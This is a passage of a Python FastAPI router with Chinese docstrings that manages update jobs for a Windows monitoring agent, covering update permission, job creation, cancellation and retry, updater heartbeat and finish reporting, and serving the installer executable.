    update_available = _is_newer_version(target_payload["version"], version)
    allowed = bool(allowed_version) and allowed_version == target_payload["version"] and update_available
    return {
        **target_payload,
        "agent": agent,
        "current_version": version,
        "update_available": update_available,
        "allowed": allowed,
        "allowed_version": allowed_version,
        "job": latest_job,
    }


@router.post("/agents/{agent_name}/update/allow")
async def allow_agent_update(agent_name: str, data: dict | None = None):
    """允许单台 Agent 更新到当前最新版。"""
    requested = (data or {}).get("version")
    version = requested or _agent_version_payload()["version"]
    _agent_version_row(version)
    try:
        job = create_agent_update_job(agent_name, version)
    except RuntimeError as exc:
        raise HTTPException(status_code=409, detail=str(exc))
    if not job:
        raise HTTPException(status_code=404, detail="Agent 不存在")
    set_agent_update_permission(agent_name, version)
    return {"status": "ok", "agent": agent_name, "version": version, "job": job}


@router.post("/agents/{agent_name}/update/pause")
async def pause_agent_update(agent_name: str):
    """暂停/清除单台 Agent 更新许可。"""
    latest_job = get_latest_update_job(agent_name)
    if latest_job and latest_job.get("status") in ("pending", "claimed", "downloaded"):
        cancel_update_job(latest_job["job_id"])
    ok = clear_agent_update_permission(agent_name)
    if not ok:
        raise HTTPException(status_code=404, detail="Agent 不存在")
    return {"status": "ok", "agent": agent_name}


@router.post("/agents/{agent_name}/update/jobs")
async def create_update_job(agent_name: str, data: dict | None = None):
    """为单台 Agent 创建更新任务。"""
    requested = (data or {}).get("version")
    version = requested or _agent_version_payload()["version"]
    _agent_version_row(version)
    try:
        job = create_agent_update_job(agent_name, version)
    except RuntimeError as exc:
        raise HTTPException(status_code=409, detail=str(exc))
    if not job:
        raise HTTPException(status_code=404, detail="Agent 不存在")
    return {"status": "ok", "job": job}


@router.get("/agents/{agent_name}/update/jobs/latest")
async def latest_update_job(agent_name: str):
    """查询单台 Agent 最新更新任务。"""
    reap_stale_update_jobs()
    job = get_latest_update_job(agent_name)
    return {"status": "ok", "job": job, "events": list_update_events(job["job_id"], 10) if job else []}


@router.post("/agents/{agent_name}/update/jobs/{job_id}/cancel")
async def cancel_agent_update_job(agent_name: str, job_id: str):
    job = cancel_update_job(job_id)
    if not job or job.get("agent_name") != agent_name:
        raise HTTPException(status_code=404, detail="任务不存在或不可取消")
    clear_agent_update_permission(agent_name)
    return {"status": "ok", "job": job}


@router.post("/agents/{agent_name}/update/jobs/{job_id}/retry")
async def retry_agent_update_job(agent_name: str, job_id: str):
    job = retry_update_job(job_id)
    if not job or job.get("agent_name") != agent_name:
        raise HTTPException(status_code=404, detail="任务不存在或不可重试")
    set_agent_update_permission(agent_name, job["target_version"])
    return {"status": "ok", "job": job}


@router.get("/updater/jobs/next")
async def updater_next_job(
    install_id: str = Query(""),
    machine_id: str = Query(""),
    updater_version: str = Query(""),
):
    """独立 Updater 拉取属于本机的任务。"""
    reap_stale_update_jobs()
    job = claim_next_update_job(install_id=install_id, machine_id=machine_id, updater_version=updater_version)
    if not job:
        return {"status": "ok", "job": None}
    payload = _agent_version_payload(job["target_version"])
    return {"status": "ok", "job": job, "version": payload}


@router.post("/updater/jobs/{job_id}/heartbeat")
async def updater_job_heartbeat(job_id: str, data: dict):
    """独立 Updater 上报进度和阶段。"""
    job = update_job_heartbeat(
        job_id,
        status=(data.get("status") or ""),
        progress_bytes=data.get("progress_bytes"),
        total_bytes=data.get("total_bytes"),
        message=(data.get("message") or ""),
        error=(data.get("error") or ""),
    )
    if not job:
        raise HTTPException(status_code=404, detail="更新任务不存在")
    return {"status": "ok", "job": job}


@router.post("/updater/jobs/{job_id}/events")
async def updater_job_event(job_id: str, data: dict):
    """独立 Updater 上传日志事件。"""
    message = data.get("message") or ""
    if not message:
        raise HTTPException(status_code=400, detail="message 不能为空")
    job = update_job_heartbeat(
        job_id,
        status=(data.get("stage") or ""),
        message=message,
        error=message if str(data.get("level") or "").upper() == "ERROR" else "",
    )
    if not job:
        raise HTTPException(status_code=404, detail="更新任务不存在")
    return {"status": "ok", "job": job}


@router.post("/updater/jobs/{job_id}/finish")
async def updater_job_finish(job_id: str, data: dict):
    """独立 Updater 结束任务。"""
    status = data.get("status") or ""
    if status not in ("verified", "failed", "rolled_back_verified", "rolled_back_unverified", "stale", "canceled"):
        raise HTTPException(status_code=400, detail="非法结束状态")
    job = finish_update_job(job_id, status, message=(data.get("message") or ""), error=(data.get("error") or ""))
    if not job:
        raise HTTPException(status_code=404, detail="更新任务不存在")
    if status in ("verified", "rolled_back_verified", "rolled_back_unverified", "canceled"):
        clear_agent_update_permission(job["agent_name"])
    return {"status": "ok", "job": job}


@router.get("/agent/download")
async def download_agent():
    """下载 Agent 安装器。"""
    payload = _agent_version_payload()
    row = _agent_version_row(payload["version"])
    return FileResponse(
        path=row["setup_path"],
        filename=f"WindowsMonitorSetup-{payload['version']}.exe",
        media_type="application/vnd.microsoft.portable-executable",
        headers={
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
            "Pragma": "no-cache",
            "Expires": "0",
        },
    )
